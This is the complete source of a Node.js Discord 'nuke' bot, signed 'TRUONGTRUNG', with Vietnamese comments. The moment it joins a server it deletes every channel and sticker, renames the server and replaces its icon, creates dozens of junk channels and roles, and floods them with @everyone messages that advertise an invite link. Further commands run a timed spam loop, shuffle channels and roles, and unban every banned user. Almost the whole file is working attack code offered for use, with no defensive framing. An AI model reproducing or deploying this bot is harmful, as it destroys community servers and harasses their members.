const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');
const sizeOf = require('image-size');

let autoNukeActive = false;

const MESSAGE = "I am not in danger Discord, TRUONGTRUNG IS DANGER.";
const IMAGE_URL1 = "https://i.imgur.com/OigzItQ.png";
const IMAGE_URL2 = "https://discord.com/invite/GkMUrP5wjh";

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function validateImage(filePath) {
    const imageBuffer = await fs.readFile(filePath);
    const dimensions = sizeOf(imageBuffer);

    if (dimensions.type !== 'png' && dimensions.type !== 'apng') {
        throw new Error('Image must be in PNG or APNG format');
    }

    const stats = await fs.stat(filePath);
    if (stats.size > 500 * 1024) {
        throw new Error('Image size must be less than 500 KB');
    }

    if (dimensions.width < 320 || dimensions.height < 320 || dimensions.width > 4096 || dimensions.height > 4096) {
        throw new Error('Image dimensions must be between 320x320 and 4096x4096 pixels');
    }

    return imageBuffer;
}

function shuffleArray(array) {
    const shuffled = array.slice();
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

function getRandomColor() {
    const letters = '0123456789ABCDEF';
    let color = '#';
    for (let i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
}

async function shuffleChannels(guild, duration = 60000) {
    const endTime = Date.now() + duration;

    while (Date.now() < endTime) {
        const channels = Array.from(guild.channels.cache.values());
        const shuffledChannels = shuffleArray(channels);

        const setPositionPromises = [];
        for (let i = 0; i < channels.length; i++) {
            setPositionPromises.push(channels[i].setPosition(shuffledChannels[i].position).catch(console.error));
        }

        await Promise.all(setPositionPromises);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
    }
}

async function shuffleRoles(guild, duration = 60000) {
    const endTime = Date.now() + duration;

    while (Date.now() < endTime) {
        const roles = Array.from(guild.roles.cache.values());
        const shuffledRoles = shuffleArray(roles);

        const setPositionPromises = [];
        for (let i = 0; i < roles.length; i++) {
            setPositionPromises.push(roles[i].setPosition(shuffledRoles[i].position).catch(console.error));
        }

        await Promise.all(setPositionPromises);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
    }
}

async function performAttack(guild, config) {
    console.log('Performing attack on guild:', guild.name);

    // Xóa kênh và sticker cũ
    const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));

    // Đặt lại tên và icon server
    const setNamePromise = guild.setName(config.newServerName).catch(console.error);
    const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));

    // Tạo 40 kênh và 10 vai trò
    const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: 0 })));
    const createRolesPromise = Promise.all(roleNames.map(name => guild.roles.create({ 
        name, 
        permissions: [], 
        color: getRandomColor() // Màu sắc ngẫu nhiên
    }).catch(console.error)));

    // Tạo sticker
    let createStickersPromise = Promise.resolve();
    try {
        const iconPngBuffer = await validateImage('./converted_image.png');
        createStickersPromise = Promise.all(
            Array.from({ length: 5 }, (_, i) => 
                guild.stickers.create({
                    file: iconPngBuffer,
                    name: `Sticker${i + 1}`,
                    description: `Description for Sticker${i + 1}`,
                    tags: `sticker${i + 1}`
                }).catch(console.error)
            )
        );
    } catch (error) {
        console.error('Error validating or creating sticker:', error);
    }

    // Thực hiện tất cả các lời hứa cùng lúc
    await Promise.all([
        deleteChannelsPromise,
        setNamePromise,
        setIconPromise,
        createChannelsPromise,
        createRolesPromise,
        deleteStickersPromise,
        createStickersPromise
    ]);

    // Spam tin nhắn
    const newChannels = await createChannelsPromise;
    const spamPromises = [];
    const embed = new EmbedBuilder()
        .setTitle("HACK BY TRUONGTRUNG!!!")
        .setDescription(`@everyone @here\nTHIS SERVER HAS BEEN ATTACKED BY TRUONGTRUNG!\n${MESSAGE}`)
        .setImage(IMAGE_URL1)
        .addFields({ name: "THAM GIA KÊNH", value: `[NHẤN VÀO ĐÂY](${IMAGE_URL2})`, inline: false });
    
    for (let i = 0; i < 5; i++) {
        for (const channel of newChannels) {
            spamPromises.push(channel.send({ content: "@everyone @here", embeds: [embed] }).catch(console.error));
        }
    }
    await Promise.all(spamPromises);
}

async function autoNuke(guild, config) {
    autoNukeActive = true;
    const newChannels = await guild.channels.fetch();
    const endTime = Date.now() + 3 * 60 * 1000; // 3 minutes from now

    while (autoNukeActive && Date.now() < endTime) {
        const spamPromises = [];
        const embed = new EmbedBuilder()
            .setTitle("HACK BY TRUONGTRUNG!!!")
            .setDescription(`@everyone @here\nTHIS SERVER HAS BEEN ATTACKED BY TRUONGTRUNG!\n${MESSAGE}`)
            .setImage(IMAGE_URL1)
            .addFields({ name: "THAM GIA KÊNH", value: `[NHẤN VÀO ĐÂY](${IMAGE_URL2})`, inline: false });

        for (const channel of newChannels.values()) {
            if (channel.isTextBased()) {
                spamPromises.push(channel.send({ content: "@everyone @here", embeds: [embed] }).catch(console.error));
            }
        }
        await Promise.all(spamPromises);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next spam wave
    }
    autoNukeActive = false;
}

async function main() {
    const config = await loadConfig();

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    client.on('guildCreate', async guild => {
        await performAttack(guild, config);
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;
    
        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();
    
        if (autoNukeActive && (command === 'attack' || command === 'shuffle_channels' || command === 'shuffle_roles')) {
            message.channel.send('Cannot use this command while auto nuke is active.');
            return;
        }
    
        if (command === 'attack') {
            await performAttack(message.guild, config);
        } else if (command === 'unban_all') {
            try {
                const bans = await message.guild.bans.fetch();
                const unbanPromises = bans.map(ban => message.guild.members.unban(ban.user));
                await Promise.all(unbanPromises);
                message.channel.send(`Unbanned all users (${bans.size})`);
            } catch (error) {
                console.error('Error unbanning users:', error);
                message.channel.send('Failed to unban all users.');
            }
        } else if (command === 'auto_nuke') {
            if (args[0] === 'on') {
                if (!autoNukeActive) {
                    message.channel.send('Auto nuke started.');
                    autoNuke(message.guild, config);
                } else {
                    message.channel.send('Auto nuke is already running.');
                }
            } else if (args[0] === 'off') {
                if (autoNukeActive) {
                    autoNukeActive = false;
                    message.channel.send('Auto nuke stopped.');
                } else {
                    message.channel.send('Auto nuke is not running.');
                }
            } else {
                message.channel.send('Invalid argument. Use "on" or "off".');
            }
        } else if (command === 'shuffle_channels') {
            shuffleChannels(message.guild, 60000).then(() => {
                message.channel.send('Shuffled all channels.');
            });
        } else if (command === 'shuffle_roles') {
            if (!autoNukeActive) {
                shuffleRoles(message.guild, 60000).then(() => {
                    message.channel.send('Shuffled all roles.');
                });
            } else {
                message.channel.send('Cannot use this command while auto nuke is active.');
            }
        } else if (command === 'help') {
            const helpMessage = `
**Available Commands:**
\`\`\`
attack - Perform an attack on the server
!unban_all - Unban all users in the server
!auto_nuke on/off - Start or stop auto nuke
!shuffle_channels - Shuffle all channels' positions in the server for 1 minute
!shuffle_roles - Shuffle all roles' positions in the server for 1 minute
!help - Display this help message
\`\`\`
            `;
            message.channel.send(helpMessage);
        }
    });    

    client.login(config.token);
}

main().catch(console.error);
